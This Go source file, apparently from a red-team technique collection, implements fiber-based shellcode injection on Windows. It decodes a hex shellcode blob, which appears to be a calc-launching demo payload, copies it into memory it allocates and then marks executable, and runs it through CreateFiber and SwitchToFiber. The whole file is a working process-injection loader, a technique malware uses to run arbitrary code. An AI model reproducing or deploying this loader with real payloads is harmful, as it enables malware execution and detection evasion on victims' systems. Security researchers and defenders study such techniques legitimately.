//go:build windows
// +build windows

package injection

import (
	"encoding/hex"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

func CreateFiberThread() {
	shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	fmt.Println("Starting CreateFiberThread")
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	virtualProtect := kernel32.NewProc("VirtualProtect")
	rtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	convertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	createFiber := kernel32.NewProc("CreateFiber")
	switchToFiber := kernel32.NewProc("SwitchToFiber")

	// Convert main thread to Fiber
	fiberAddr, _, _ := convertThreadToFiber.Call()

	// Allocate mem for shellcode
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	// Copy shellcode to allocated mem space
	rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	// Change permissions on address space
	oldProtect := windows.PAGE_READWRITE
	virtualProtect.Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	// Call shellcode on createfiber
	fiber, _, _ := createFiber.Call(0, addr, 0)

	// Switch to fiber to call shellcode
	switchToFiber.Call(fiber)

	// Switch back to main thread
	switchToFiber.Call(fiberAddr)
	fmt.Println("Finished CreateFiberThread")
}
